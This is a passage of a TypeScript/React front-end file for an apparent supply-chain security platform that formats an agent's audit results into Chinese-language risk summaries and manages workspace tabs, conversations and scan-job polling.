  const label = AGENT_FOCUS_LABELS[focus]
  const riskClaim = supportedClaims.find((item) => !/未提供明确攻击证据|未发现明确/.test(item))
  if (riskClaim) return `${label}存在风险信号，${riskClaim}`
  if (evidenceGaps.length) return `${label}证据还不完整，需要先补齐相关材料。`
  if (unsupportedClaims.length) return `${label}暂未形成明确风险证据，${unsupportedClaims[0]}`
  if (verdict.level === 'clean') return `${label}暂未发现明确风险。`
  return `${label}没有返回独立结论，请结合对应模块详情复核。`
}

function defaultAgentActionLines(focus: AgentAnswerFocus) {
  if (focus === 'log_audit') {
    return ['1. 复核日志异常：核对异常外联、敏感接口访问或认证异常的源主机、进程、时间窗和目标地址。']
  }
  if (focus === 'cicd_audit') {
    return ['1. 复核构建链：检查 workflow、runner、Action 版本、权限和构建日志是否存在异常变更。']
  }
  if (focus === 'artifact_trust') {
    return ['1. 重新校验产物：核对 artifact、digest、provenance、签名和发布 commit 是否一致。']
  }
  if (focus === 'dependency_audit') {
    return ['1. 复核高风险依赖：确认依赖是否被代码 import、是否进入构建产物、是否在运行日志中出现。']
  }
  if (focus === 'code_audit') {
    return ['1. 复核代码证据：确认风险函数、入口路径、配置和密钥暴露是否可达。']
  }
  return []
}

function scopedAgentActions(actions: AgentNextAction[], focus: AgentAnswerFocus) {
  const visible = actions.filter((action) => action.actionKind !== 'export_evidence_package' && action.actionKind !== 'generate_defense_brief')
  if (focus === 'global') return visible
  return visible.filter((action) => agentTextMatchesFocus([
    action.targetModule,
    action.title,
    action.action,
    ...(action.keywords || []),
  ].join(' '), focus))
}

function compactAgentGapLines(gaps: AgentEvidenceGap[], focus: AgentAnswerFocus) {
  const scoped = focus === 'global'
    ? gaps
    : gaps.filter((gap) => agentTextMatchesFocus([
      gap.module,
      gap.reason,
      gap.question,
      gap.uploadTo,
      ...(gap.keywords || []),
    ].join(' '), focus))
  return scoped
    .slice(0, 3)
    .map((gap) => `- ${gap.module}：${gap.reason || gap.question || '需要补充证据'}`)
}

function agentRunDirectConclusion(run: AgentRunResult, question = '') {
  const focus = agentAnswerFocus(question, run)
  const verdict = run.verdict
  if (!verdict) {
    return [
      `## ${focus === 'global' ? '研判结论' : `${AGENT_FOCUS_LABELS[focus]}研判结论`}`,
      '',
      run.narrative?.summary || '本次 Agent 尚未返回统一研判结论，请查看调用步骤和证据缺口。',
    ].join('\n')
  }
  const supportedClaims = filterAgentLinesByFocus(verdict.supportedClaims, focus)
  const unsupportedClaims = filterAgentLinesByFocus(verdict.unsupportedClaims, focus)
  const evidenceGaps = filterAgentLinesByFocus(verdict.evidenceGaps, focus)
  const artifactClaim = supportedClaims.find((item) => /产物|artifact|provenance|签名|可信/.test(item))
  const impactLine = (focus === 'global' || focus === 'artifact_trust') && artifactClaim
    ? `发布门禁建议：${artifactClaim}发布前应阻断或重新校验产物；这表示门禁未通过，不等于已经证明产物遭到攻击。`
    : (focus === 'global' || focus === 'artifact_trust') && evidenceGaps.some((item) => /产物|artifact|provenance|签名/.test(item))
      ? '发布门禁建议：当前还不能确认是否影响发布产物，需要补齐 artifact、provenance 或签名证据后再决定是否放行。'
      : ''
  const title = focus === 'global' ? '研判结论' : `${AGENT_FOCUS_LABELS[focus]}研判结论`
  const conclusionLine = focus === 'global'
    ? `**${verdict.label}。**${verdict.conclusion}`
    : `**${AGENT_FOCUS_LABELS[focus]}研判。**${focusedAgentSummary(focus, verdict, supportedClaims, unsupportedClaims, evidenceGaps)}`
  const riskSource = verdict.riskScoreSource?.moduleName || run.summary.riskScoreSource?.moduleName || '已执行模块'
  const confidenceLine = verdict.confidenceType === 'graph_path' || verdict.chainEvidence?.status === 'plausible' || verdict.chainEvidence?.status === 'confirmed'
    ? `图谱路径置信度：${verdict.confidence}%（表示当前跨模块路径的证据支持程度，不是攻击发生概率）。`
    : `当前证据完整度：${verdict.confidence}%（不是攻击发生概率）。`
  const fallbackEvidenceGaps = run.evidenceGaps?.length ? [] : evidenceGaps
  return [
    `## ${title}`,
    '',
    conclusionLine,
    '',
    `最高模块风险分：${verdict.riskScore}/100（${severityLabels[verdict.riskLevel] || verdict.riskLevel}），来源：${riskSource}。该分数不是项目综合攻击概率。`,
    confidenceLine,
    impactLine,
    supportedClaims.length ? `\n### 关键证据\n${supportedClaims.slice(0, 6).map((item) => `- ${item}`).join('\n')}` : '',
    unsupportedClaims.length ? `\n### 仍需确认\n${unsupportedClaims.slice(0, 3).map((item) => `- ${item}`).join('\n')}` : '',
    fallbackEvidenceGaps.length ? `\n### 证据缺口\n${fallbackEvidenceGaps.slice(0, 3).map((item) => `- ${item}`).join('\n')}` : '',
  ].filter(Boolean).join('\n')
}

function agentCalledModuleLines(run: AgentRunResult) {
  return (run.steps || [])
    .filter((step) => step.status !== 'pending' && step.status !== 'skipped')
    .map((step) => {
      const summary = step.summary || {}
      let result = ''
      if (step.id === 'code_audit') result = `发现 ${Number(summary.total || 0)} 项`
      if (step.id === 'dependency_audit') result = `解析 ${Number(summary.dependencies || 0)} 个依赖，发现 ${Number(summary.findings || 0)} 项`
      if (step.id === 'cicd_audit') result = `${Number(summary.workflows || 0)} 个工作流、${Number(summary.steps || 0)} 个步骤，发现 ${Number(summary.findings || 0)} 项`
      if (step.id === 'artifact_trust') result = `${Number(summary.checks || 0)} 项检查，可信评分 ${Number(summary.trustScore || 0)}/100，发现 ${Number(summary.findings || 0)} 项`
      if (step.id === 'log_audit') result = `${Number(summary.files || 0)} 个文件、${Number(summary.events || 0)} 个事件，发现 ${Number(summary.findings || 0)} 项`
      if (step.id === 'workspace_report') result = '生成攻击路径图谱和溯源报告'
      const duration = step.durationSeconds > 0 ? `，耗时 ${step.durationSeconds.toFixed(2)} 秒` : ''
      return `- ${step.name}：${agentStepStatusLabel(step.status)}${result ? `，${result}` : ''}${duration}`
    })
}

function agentRunFailedOrSkippedSteps(run: AgentRunResult, focus: AgentAnswerFocus) {
  return (run.steps || [])
    .filter((step) => step.status === 'failed' || step.status === 'skipped')
    .filter((step) => agentTextMatchesFocus(`${step.id} ${step.name} ${step.error || ''}`, focus))
    .map((step) => `- ${step.name}：${agentStepStatusLabel(step.status)}${step.error ? `，${step.error}` : ''}`)
}

function compactAgentActionLines(actions: AgentNextAction[], focus: AgentAnswerFocus) {
  const scoped = scopedAgentActions(actions, focus)
  const lines = scoped
    .slice(0, 3)
    .map((action, index) => `${index + 1}. ${action.title}：${action.action}`)
  return lines.length ? lines : defaultAgentActionLines(focus)
}

function agentRunToAssistantResponse(
  question: string,
  run: AgentRunResult,
  options: { reusedEvidence?: boolean } = {},
): SecurityAssistantResponse {
  const status = String(run.status || 'unknown')
  const focus = agentAnswerFocus(question, run)
  const actions = visibleAgentNextActions(run.nextActions)
  const gapLines = compactAgentGapLines(run.evidenceGaps || [], focus)
  const issueStepLines = agentRunFailedOrSkippedSteps(run, focus)
  const actionLines = compactAgentActionLines(actions, focus)
  const calledModuleLines = agentCalledModuleLines(run)
  const evidenceChainLines = agentEvidenceChainLines(run, focus)
  const statusLine = status === 'success' || status === 'completed_with_risk'
    ? ''
    : `状态：${agentRunStatusLabel(status)}。`
  const answer = [
    agentRunDirectConclusion(run, question),
    statusLine,
    evidenceChainLines.length ? `\n### 攻击证据链\n${evidenceChainLines.join('\n')}` : '',
    calledModuleLines.length
      ? `\n### ${options.reusedEvidence ? '本次回答复用模块' : '本次调用模块'}\n${calledModuleLines.join('\n')}`
      : '',
    calledModuleLines.length && !options.reusedEvidence
      ? `本次扫描结果已自动同步到各模块，无需刷新页面。总耗时 ${Number(run.durationSeconds || 0).toFixed(2)} 秒。`
      : '',
    gapLines.length ? `\n### 需要补证\n${gapLines.join('\n')}` : '',
    issueStepLines.length ? `\n### 未完成模块\n${issueStepLines.join('\n')}` : '',
    actionLines.length ? `\n### 下一步建议\n${actionLines.join('\n')}` : '',
    run.error ? `\n### 异常\n${run.error}` : '',
  ].filter(Boolean).join('\n')

  return {
    question,
    answer,
    retrieval: [
      `Agent Job: ${run.runId || '-'}`,
      `Status: ${status}`,
      ...(run.plan?.selectedModules?.length
        ? [`Modules: ${run.plan.selectedModules.map((item) => item.name || item.id).join('、')}`]
        : []),
      ...(run.events || []).slice(-3).map((event) => `${event.stepId}: ${event.message}`),
    ],
    graph_rag: null,
    next_actions: actionLines.map((line) => line.replace(/^\d+\.\s*/, '')),
    model: 'agent-orchestrator',
  }
}

function getAssistantPayload(workspace: Pick<SecurityWorkspace, 'assistant' | 'workspace' | 'import'>): SecurityAssistantPayload {
  const assistant = workspace.assistant
  return {
    default_question: assistant?.default_question || fallbackAssistant.default_question,
    answer: assistant?.answer || fallbackAssistant.answer,
    retrieval: assistant?.retrieval ?? fallbackAssistant.retrieval,
    graph_rag: assistant?.graph_rag ?? null,
    next_actions: assistant?.next_actions?.length
      ? assistant.next_actions
      : fallbackAssistant.next_actions,
  }
}

function getWorkspaceReport(workspace: Pick<SecurityWorkspace, 'report'>) {
  return workspace.report || '# APT 供应链攻击溯源报告\n\n暂无报告内容，请先运行扫描或刷新安全态势。'
}

function createWorkspaceTab(module: PlatformTab, overrides: Partial<WorkspaceTab> = {}): WorkspaceTab {
  const canonicalModule = canonicalWorkspaceTab(module)
  return {
    ...overrides,
    id: canonicalModule,
    module: canonicalModule,
    title: workspaceTabTitles[canonicalModule],
    stepId: workspaceTabStepIds[canonicalModule],
    closable: canonicalModule !== 'overview',
    pinned: canonicalModule === 'overview',
  }
}

function canonicalWorkspaceTab(module: PlatformTab): PlatformTab {
  return module
}

function defaultWorkspaceTabs(initialTab: PlatformTab = 'overview') {
  const tabs = [createWorkspaceTab('overview')]
  if (initialTab !== 'overview') tabs.push(createWorkspaceTab(initialTab))
  return tabs
}

const agentModuleTabs: PlatformTab[] = [
  'code',
  'supply',
  'pipeline',
  'artifact',
  'logs',
  'multimodal',
  'graph',
  'report',
]

function getWorkspaceId(workspace: SecurityWorkspace | null) {
  return workspace?.workspaceId || workspace?.workspace?.workspaceId || 'latest'
}

function getImportSummary(workspace: SecurityWorkspace | null) {
  return workspace?.import?.summary
}

function isCompletedScanStatus(status?: string | null) {
  return ['completed', 'partial', 'failed', 'completed_with_risk', 'needs_input'].includes(status || '')
}

function isWorkspaceScanned(workspace: SecurityWorkspace | null) {
  return isCompletedScanStatus(workspace?.scanSuite?.status)
}

function workspaceHasModuleDetails(workspace: SecurityWorkspace | null) {
  if (!workspace) return false
  return Boolean(
    (workspace.dependencies?.length ?? 0) > 0 ||
    (workspace.dependency_audit?.dependencies?.length ?? 0) > 0 ||
    (workspace.dependency_audit?.findings?.length ?? 0) > 0 ||
    (workspace.cicd_audit?.findings?.length ?? 0) > 0 ||
    (workspace.artifact_trust?.checks?.length ?? 0) > 0 ||
    (workspace.log_audit?.findings?.length ?? 0) > 0 ||
    (workspace.multimodal_audit?.evidence?.length ?? 0) > 0 ||
    (workspace.graph?.attack_paths?.length ?? 0) > 0
  )
}

function workspaceHasModulePayload(workspace: SecurityWorkspace, moduleId: string) {
  if (moduleId === 'code_audit') return Boolean(workspace.code_audit?.scan_id || (workspace.code_audit?.findings?.length ?? 0) > 0)
  if (moduleId === 'dependency_audit') {
    return Boolean(
      workspace.dependency_audit?.scan_id ||
      (workspace.dependency_audit?.dependencies?.length ?? 0) > 0 ||
      (workspace.dependencies?.length ?? 0) > 0 ||
      (workspace.dependency_audit?.findings?.length ?? 0) > 0
    )
  }
  if (moduleId === 'cicd_audit') return Boolean(workspace.cicd_audit?.scan_id || (workspace.cicd_audit?.findings?.length ?? 0) > 0)
  if (moduleId === 'artifact_trust') return Boolean(workspace.artifact_trust?.scan_id || (workspace.artifact_trust?.checks?.length ?? 0) > 0)
  if (moduleId === 'log_audit') return Boolean(workspace.log_audit?.scan_id || (workspace.log_audit?.findings?.length ?? 0) > 0)
  if (moduleId === 'multimodal_audit') {
    return Boolean(
      workspace.multimodal_audit?.scan_id ||
      (workspace.multimodal_audit?.evidence?.length ?? 0) > 0
    )
  }
  if (moduleId === 'workspace_report') return Boolean(workspace.report || (workspace.graph?.attack_paths?.length ?? 0) > 0)
  return true
}

function workspaceMissingCompletedModuleDetails(workspace: SecurityWorkspace | null) {
  if (!workspace) return false
  const completed = workspace.scanSuite?.completed ?? []
  if (!completed.length) return isWorkspaceScanned(workspace) && !workspaceHasModuleDetails(workspace)
  return completed.some((moduleId) => !workspaceHasModulePayload(workspace, moduleId))
}

async function loadWorkspaceUntilModulePayloads(
  workspaceId: string,
  fallback?: SecurityWorkspace | null,
  expectedRunId?: string | null,
  attempts = 8
) {
  let latest = fallback ?? null
  for (let index = 0; index < attempts; index += 1) {
    try {
      latest = await loadSecurityWorkspaceById(workspaceId)
      const currentRunReady = !expectedRunId || latest.agentRun?.runId === expectedRunId
      if (currentRunReady && !workspaceMissingCompletedModuleDetails(latest)) return latest
    } catch {
      if (index === attempts - 1 && latest) return latest
    }
    await sleep(index === 0 ? 250 : 700)
  }
  return latest ?? loadSecurityWorkspaceById(workspaceId)
}

function conversationSummaryFromWorkspace(workspace: SecurityWorkspace): SecurityConversation['summary'] {
  const preflight = getImportSummary(workspace)
  const fileStats = preflight?.fileStats
  const scanned = isWorkspaceScanned(workspace)
  return {
    scanStatus: workspace.scanSuite?.status ?? (scanned ? 'completed' : 'preflight'),
    riskScore: scanned ? workspace.summary.risk_score : null,
    riskLevel: scanned ? workspace.summary.risk_level : 'preflight',
    attackPaths: scanned ? workspace.summary.attack_paths : null,
    dependencies: workspace.summary.dependencies,
    findings: workspace.summary.open_findings,
    preflightFiles: fileStats?.total ?? 0,
    preflightScannable: fileStats?.scannable ?? 0,
    dependencyFiles: preflight?.dependencyFiles?.length ?? workspace.summary.dependencies,
    ciFiles: preflight?.ciFiles?.length ?? workspace.summary.build_steps,
    primaryLanguage: preflight?.languages?.[0]?.name ?? '',
  }
}

function workspaceTabsStorageKey(workspace: SecurityWorkspace | null) {
  return `supplyguard.workspace-tabs.${getWorkspaceId(workspace)}`
}

function ensureOverviewTab(tabs: WorkspaceTab[]) {
  const uniqueTabs = new Map<WorkspaceTab['id'], WorkspaceTab>()
  uniqueTabs.set('overview', createWorkspaceTab('overview'))
  for (const tab of tabs) uniqueTabs.set(tab.id, tab)
  return Array.from(uniqueTabs.values())
}

export function SecurityPlatform() {
  const { auth } = useAuthStore()
  const [workspace, setWorkspace] = useState<SecurityWorkspace | null>(null)
  const [loading, setLoading] = useState(true)
  const [refreshing, setRefreshing] = useState(false)
  const [question, setQuestion] = useState('')
  const [assistantMode, setAssistantMode] = useState<AssistantMode>('graphrag')
  const [assistantMessages, setAssistantMessages] =
    useState<SecurityAssistantResponse[]>([])
  const [assistantAttachments, setAssistantAttachments] = useState<AgentAttachment[]>([])
  const [assistantAttachmentBusy, setAssistantAttachmentBusy] = useState(false)
  const [assistantBusy, setAssistantBusy] = useState(false)
  const [conversations, setConversations] = useState<SecurityConversation[]>([])
  const [activeConversationId, setActiveConversationId] = useState('')
  const [draftConversation, setDraftConversation] = useState(false)
  const initialTab = tabFromHash(window.location.hash)
  const [openTabs, setOpenTabs] = useState<WorkspaceTab[]>(() =>
    defaultWorkspaceTabs(initialTab)
  )
  const [activeTabId, setActiveTabId] = useState<WorkspaceTab['id']>(initialTab)
  const [restoredTabsKey, setRestoredTabsKey] = useState('')
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false)
  const [scanStateByWorkspace, setScanStateByWorkspace] = useState<Record<string, ScanWorkspaceState>>({})
  const activeWorkspaceRef = useRef('')
  const contentScrollRef = useRef<HTMLDivElement>(null)
  const moduleRepairRef = useRef('')
  const [moduleViewKey, setModuleViewKey] = useState(0)

  const activeWorkspaceKey = workspace ? getWorkspaceId(workspace) : ''
  const activeScanState = activeWorkspaceKey
    ? scanStateByWorkspace[activeWorkspaceKey] ?? scanStateFromWorkspace(workspace)
    : freshScanState()
  const analysisStarted = activeScanState.completed
  const scanRunning = activeScanState.running
  const scanSteps = activeScanState.steps
  const activeWorkspaceTab =
    openTabs.find((tab) => tab.id === activeTabId) ?? createWorkspaceTab('overview')
  const workspaceDataKey = workspace
    ? [
        activeWorkspaceKey,
        workspace.scanSuite?.agentRunId ?? workspace.scanSuite?.completedAt ?? '',
        workspace.dependencies?.length ?? 0,
        workspace.dependency_audit?.dependencies?.length ?? 0,
        workspace.dependency_audit?.findings?.length ?? 0,
        workspace.cicd_audit?.findings?.length ?? 0,
        workspace.artifact_trust?.checks?.length ?? 0,
        workspace.log_audit?.findings?.length ?? 0,
        workspace.multimodal_audit?.evidence?.length ?? 0,
        workspace.graph?.attack_paths?.length ?? 0,
        workspace.report?.length ?? 0,
      ].join(':')
    : 'empty'

  useEffect(() => {
    activeWorkspaceRef.current = activeWorkspaceKey
    setAssistantAttachments([])
  }, [activeWorkspaceKey])

  useEffect(() => {
    moduleRepairRef.current = ''
  }, [activeWorkspaceKey])

  useEffect(() => {
    if (!workspace || !activeWorkspaceKey || activeWorkspaceKey === 'latest') return
    if (!activeScanState.completed || !workspaceMissingCompletedModuleDetails(workspace)) return
    const repairKey = `${activeWorkspaceKey}:${workspace.scanSuite?.agentRunId ?? workspace.scanSuite?.completedAt ?? 'completed'}`
    if (moduleRepairRef.current === repairKey) return
    moduleRepairRef.current = repairKey
    loadSecurityWorkspaceById(activeWorkspaceKey)
      .then((nextWorkspace) => {
        if (activeWorkspaceRef.current !== activeWorkspaceKey) return
        if (!workspaceMissingCompletedModuleDetails(nextWorkspace) || workspaceHasModuleDetails(nextWorkspace)) {
          applyWorkspaceUpdate(nextWorkspace, { refreshModules: true })
        }
      })
      .catch(() => undefined)
  }, [activeWorkspaceKey, activeScanState.completed, workspace])

  useLayoutEffect(() => {
    const scrollToTop = () => {
      contentScrollRef.current?.scrollTo({ top: 0, left: 0, behavior: 'auto' })
      window.scrollTo({ top: 0, left: 0, behavior: 'auto' })
      document.documentElement.scrollTop = 0
      document.body.scrollTop = 0
    }
    scrollToTop()
    const firstFrame = window.requestAnimationFrame(() => {
      scrollToTop()
      const secondFrame = window.requestAnimationFrame(scrollToTop)
      window.setTimeout(scrollToTop, 80)
      window.setTimeout(() => window.cancelAnimationFrame(secondFrame), 120)
    })
    return () => window.cancelAnimationFrame(firstFrame)
  }, [activeWorkspaceTab.id, activeWorkspaceKey])

  function setWorkspaceScanState(
    workspaceId: string,
    updater: ScanWorkspaceState | ((current: ScanWorkspaceState) => ScanWorkspaceState)
  ) {
    setScanStateByWorkspace((states) => {
      const current = states[workspaceId] ?? readStoredScanState(workspaceId) ?? freshScanState()
      const next = typeof updater === 'function' ? updater(current) : updater
      writeStoredScanState(workspaceId, next)
      return { ...states, [workspaceId]: next }
    })
  }

  function loadAssistantHistory(workspaceId: string) {
    setAssistantMessages(readStoredAssistantHistory(workspaceId))
  }

  function appendAssistantMessage(workspaceId: string, message: SecurityAssistantResponse) {
    setAssistantMessages((current) => {
      const next = [...current, message].slice(-assistantHistoryLimit)
      writeStoredAssistantHistory(workspaceId, next)
      return next
    })
  }

  async function addAssistantAttachments(files: File[]) {
    if (!files.length || assistantAttachmentBusy) return
    if (!workspace) {
      toast.error('请先选择或导入一个项目')
      return
    }
    setAssistantAttachmentBusy(true)
    try {
      const result = await uploadAgentAttachments(files, getWorkspaceId(workspace))
      setAssistantAttachments((current) => {
        const existing = new Set(current.map((item) => item.sha256))
        return [...current, ...result.attachments.filter((item) => !existing.has(item.sha256))]
      })
      setAssistantMode('agent')
      toast.success(`已添加 ${result.attachments.length} 个 Agent 附件`)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'Agent 附件上传失败')
    } finally {
      setAssistantAttachmentBusy(false)
    }
  }


  function applyWorkspaceUpdate(
    nextWorkspace: SecurityWorkspace,
    options: { scanState?: ScanWorkspaceState; refreshModules?: boolean } = {}
  ) {
    const nextWorkspaceId = getWorkspaceId(nextWorkspace)
    setWorkspace(nextWorkspace)
    setWorkspaceScanState(nextWorkspaceId, options.scanState ?? scanStateFromWorkspace(nextWorkspace))
    setConversations((items) =>
      items.map((item) =>
        item.workspaceId === nextWorkspaceId
          ? {
              ...item,
              summary: conversationSummaryFromWorkspace(nextWorkspace),
              updatedAt: new Date().toISOString(),
            }
          : item
      )
    )
    if (options.refreshModules) {
      setModuleViewKey((current) => current + 1)
    }
  }

  async function loadWorkspace(workspaceId?: string, showToast = false) {
    setRefreshing(true)
    try {
      const payload = workspaceId
        ? await loadSecurityWorkspaceById(workspaceId)
        : await loadSecurityWorkspace()
      const nextWorkspaceId = getWorkspaceId(payload)
      const workspaceScanState = scanStateFromWorkspace(payload)
      const storedScanState = readStoredScanState(nextWorkspaceId)
      const nextScanState = workspaceScanState.completed
        ? workspaceScanState
        : storedScanState?.running
          ? storedScanState
          : workspaceScanState
      loadAssistantHistory(nextWorkspaceId)
      applyWorkspaceUpdate(payload, { scanState: nextScanState, refreshModules: true })
      if (showToast) toast.success('安全态势已刷新')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '加载安全态势失败')
    } finally {
      setLoading(false)
      setRefreshing(false)
    }
  }

  async function loadConversationList(preferredConversationId?: string) {
    setLoading(true)
    try {
      const payload = await listConversations()
      setConversations(payload.conversations)
      const selected =
        payload.conversations.find((item) => item.conversationId === preferredConversationId) ??
        payload.conversations[0]
      if (selected?.workspaceId) {
        setActiveConversationId(selected.conversationId)
        setDraftConversation(false)
        await loadWorkspace(selected.workspaceId)
      } else {
        setActiveConversationId('')
        setDraftConversation(false)
        setWorkspace(null)
        setAssistantMessages([])
      }
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '加载历史对话失败')
    } finally {
      setLoading(false)
      setRefreshing(false)
    }
  }

  useEffect(() => {
    void loadConversationList()
  }, [])

  useEffect(() => {
    const onHashChange = () => openWorkspaceTab(tabFromHash(window.location.hash))
    onHashChange()
    window.addEventListener('hashchange', onHashChange)
    return () => window.removeEventListener('hashchange', onHashChange)
  }, [])

  useEffect(() => {
    if (!workspace) return
    const storageKey = workspaceTabsStorageKey(workspace)
    if (restoredTabsKey === storageKey) return

    const hashTab = canonicalWorkspaceTab(tabFromHash(window.location.hash))
    setOpenTabs(defaultWorkspaceTabs(hashTab))
    setActiveTabId(hashTab)
    setRestoredTabsKey(storageKey)
  }, [workspace, restoredTabsKey])

  useEffect(() => {
    if (!workspace || !restoredTabsKey) return
    window.localStorage.setItem(
      restoredTabsKey,
      JSON.stringify({ openTabs: [createWorkspaceTab('overview')], activeTabId: 'overview' })
    )
  }, [workspace, restoredTabsKey, openTabs, activeTabId])

  function openWorkspaceTab(target: PlatformTab | WorkspaceTab) {
    const nextTab = typeof target === 'string'
      ? createWorkspaceTab(target)
      : createWorkspaceTab(canonicalWorkspaceTab(target.module), target)
    setModuleViewKey((current) => current + 1)
    setOpenTabs((currentTabs) => {
      if (currentTabs.some((tab) => tab.id === nextTab.id)) return currentTabs
      return ensureOverviewTab([...currentTabs, nextTab])
    })
    setActiveTabId(nextTab.id)
    window.history.replaceState(null, '', `#${nextTab.module}`)
  }

  function closeWorkspaceTab(tabId: WorkspaceTab['id']) {
    setOpenTabs((currentTabs) => {
      const closingIndex = currentTabs.findIndex((tab) => tab.id === tabId)
      const closingTab = currentTabs[closingIndex]
      if (!closingTab || !closingTab.closable) return currentTabs
      const nextTabs = currentTabs.filter((tab) => tab.id !== tabId)
      if (activeTabId === tabId) {
        const fallbackTab = nextTabs[Math.max(0, closingIndex - 1)] ?? nextTabs[0]
        setActiveTabId(fallbackTab?.id ?? 'overview')
        window.history.replaceState(null, '', `#${fallbackTab?.module ?? 'overview'}`)
      }
      return ensureOverviewTab(nextTabs)
    })
  }

  async function submitQuestion() {
    const value = question.trim()
    if (!value) return
    if (assistantMode === 'graphrag' && workspace && isImportedSecurityWorkspace(workspace) && !activeScanState.completed) {
      const assistant = getWaitingAssistantPayload(workspace, value)
      appendAssistantMessage(getWorkspaceId(workspace), {
        question: value,
        answer: assistant.answer,
        retrieval: assistant.retrieval,
        graph_rag: assistant.graph_rag ?? null,
        next_actions: assistant.next_actions,
        model: 'waiting-for-scan',
      })
      setQuestion('')
      return
    }
    setAssistantBusy(true)
    try {
      const response = assistantMode === 'agent' && workspace
        ? await runAgentQuestion(value, workspace, assistantAttachments)
        : await askSecurityAssistant(value, workspace ? getWorkspaceId(workspace) : undefined)
      if (workspace) {
        appendAssistantMessage(getWorkspaceId(workspace), response)
      } else {
        setAssistantMessages((current) => [...current, response].slice(-assistantHistoryLimit))
      }
      setQuestion('')
      setAssistantAttachments([])
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '安全助手分析失败')
    } finally {
      setAssistantBusy(false)
    }
  }

  async function runAgentQuestion(
    value: string,
    currentWorkspace: SecurityWorkspace,
    attachments: AgentAttachment[] = [],
  ): Promise<SecurityAssistantResponse> {
    const request = agentRequestFromWorkspace(currentWorkspace)
    const workspaceId = getWorkspaceId(currentWorkspace)
    const decision = decideAgentQuestionAction(value, isWorkspaceScanned(currentWorkspace))
    if (decision.action === 'answer' && !attachments.length) {
      const response = await askSecurityAgentChat(value, workspaceId)
      const previousRun = currentWorkspace.agentRun
        ? { ...currentWorkspace.agentRun, workspace: currentWorkspace }
        : undefined
      const focus = agentAnswerFocus(value, previousRun)
      const structuredResponse = previousRun && focus === 'global'
        ? agentRunToAssistantResponse(value, previousRun, { reusedEvidence: true })
        : undefined
      const reusedModules = (currentWorkspace.agentRun?.steps || [])
        .filter((step) => step.status === 'success')
        .map((step) => step.name)
      toast.success('Agent 已复用当前扫描证据，本次未重复扫描')
      return {
        ...response,
        answer: [
          structuredResponse?.answer || response.answer,
          '\n### 本次调用说明',
          '- 本次未重新调用扫描工具。',
          reusedModules.length ? `- 复用已完成模块：${reusedModules.join('、')}。` : '- 复用当前工作区已保存的扫描证据。',
          `- 回答方式：${response.graph_rag ? 'GraphRAG 检索攻击路径和证据关系' : '基于当前调查状态研判'}。`,
        ].join('\n'),
        retrieval: [
          '执行方式：复用当前工作区证据，未重新调用扫描工具。',
          ...(response.retrieval || []),
        ],
        model: response.graph_rag ? 'agent-graphrag' : response.model,
      }
    }
    const created = await createSecurityAgentJob({
      ...request,
      question: value,
      ...(attachments.length ? { attachmentPaths: attachments.map((item) => item.path) } : {}),
    })
    toast.success(
      decision.reason === 'first_scan'
        ? 'Agent 正在规划并执行首次扫描'
        : 'Agent 正在按问题范围增量重新扫描'
    )
    let result = created
    setWorkspaceScanState(workspaceId, scanStateFromAgentRun(result, currentWorkspace))
    for (let index = 0; index < 120; index += 1) {
      if (!result.runId || !['queued', 'running', 'idle'].includes(String(result.status))) break
      await sleep(1500)
      result = await loadSecurityAgentJob(result.runId)
      const snapshotWorkspace = result.workspace ?? currentWorkspace
      if (result.workspace && getWorkspaceId(result.workspace) === workspaceId) {
        applyWorkspaceUpdate(result.workspace, {
          scanState: scanStateFromAgentRun(result, result.workspace),
        })
      } else {
        setWorkspaceScanState(workspaceId, scanStateFromAgentRun(result, snapshotWorkspace))
      }
    }
    const finalWorkspace = await loadWorkspaceUntilModulePayloads(
      workspaceId,
      result.workspace ?? currentWorkspace,
      result.runId
    )
    const finalResult = finalWorkspace.agentRun?.runId === result.runId
      ? finalWorkspace.agentRun
      : result
    applyWorkspaceUpdate(finalWorkspace, {
      scanState: scanStateFromAgentRun(finalResult, finalWorkspace),
      refreshModules: true,
    })
    return agentRunToAssistantResponse(value, { ...finalResult, workspace: finalWorkspace })
  }

  async function selectConversation(conversation: SecurityConversation) {
    setActiveConversationId(conversation.conversationId)
    setDraftConversation(false)
    setOpenTabs(defaultWorkspaceTabs('overview'))
    setActiveTabId('overview')
    await loadWorkspace(conversation.workspaceId)
  }

  function startDraftConversation() {
    setActiveConversationId('')
    setDraftConversation(true)
    setWorkspace(null)
    setAssistantMessages([])
    setOpenTabs(defaultWorkspaceTabs('overview'))
    setActiveTabId('overview')
    window.history.replaceState(null, '', '#overview')
  }

  async function removeConversation(conversationId: string) {
    try {
      await deleteConversation(conversationId)
      const remaining = conversations.filter((item) => item.conversationId !== conversationId)
      setConversations(remaining)
      toast.success('历史对话已删除')
      if (activeConversationId === conversationId) {
        const next = remaining[0]
        if (next) await selectConversation(next)
        else startDraftConversation()
      }
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '删除历史对话失败')
    }
  }

  async function updateConversationTitle(conversationId: string, title: string) {
    try {
      const updated = await renameConversation(conversationId, title)
      setConversations((items) =>
        items.map((item) => (item.conversationId === conversationId ? updated : item))
      )
      toast.success('对话标题已更新')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '重命名失败')
    }
  }

  async function bindImportToConversation(
    record: ProjectImportRecord,
    options: { targetTab?: PlatformTab; successMessage?: string } = {}
  ) {
    const targetTab = options.targetTab ?? 'overview'
    const nextWorkspace = await createSecurityWorkspace({
      importId: record.importId,
      name: record.projectName,
    })
    const nextConversation = await createConversation({
      workspaceId: nextWorkspace.workspaceId || nextWorkspace.workspace?.workspaceId || '',
      importId: record.importId,
      title: record.projectName,
    })
    setWorkspace(nextWorkspace)
    const initialScanState = freshScanState()
    setAssistantMessages([])
    writeStoredAssistantHistory(getWorkspaceId(nextWorkspace), [])
    setDraftConversation(false)
    setActiveConversationId(nextConversation.conversationId)
    setConversations((items) => [
      nextConversation,
      ...items.filter((item) => item.conversationId !== nextConversation.conversationId),
    ])
    setOpenTabs(defaultWorkspaceTabs(targetTab))
    setActiveTabId(targetTab)
    window.history.replaceState(null, '', `#${targetTab}`)
    setWorkspaceScanState(getWorkspaceId(nextWorkspace), initialScanState)
    toast.success(options.successMessage ?? '项目已导入，对话已创建')
  }

  async function supplementProjectArchive(file: File, targetTab: PlatformTab) {
    const record = await uploadProjectArchive(file)
    if (!workspace) return
    const workspaceId = getWorkspaceId(workspace)
    const newImportId = record.importId

    if (targetTab === 'code') {
